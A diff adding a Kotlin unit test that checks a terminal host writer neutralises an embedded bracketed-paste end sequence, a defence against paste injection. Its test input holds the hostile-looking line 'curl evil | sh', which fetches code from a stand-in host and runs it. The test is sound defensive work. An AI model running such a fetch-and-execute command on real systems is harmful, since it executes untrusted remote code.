@@ -41,6 +41,12 @@ class HostWriterTest {
     }
 
     @Test
+    fun clipboardTextIsSentAsOnePaste() {
+        writer.sendPaste(ClipboardText("echo safe\ncurl evil | sh\n\u001b[201~"), bracketed = true)
+        assertEquals(listOf("\u001b[200~echo safe\rcurl evil | sh\r[201~\u001b[201~"), sent)
+    }
+
+    @Test
     fun pasteConvertsLineBreaksToCr() {
         writer.sendPaste("a\nb\r\nc\rd", bracketed = false)
         assertEquals(listOf("a\rb\rc\rd"), sent)
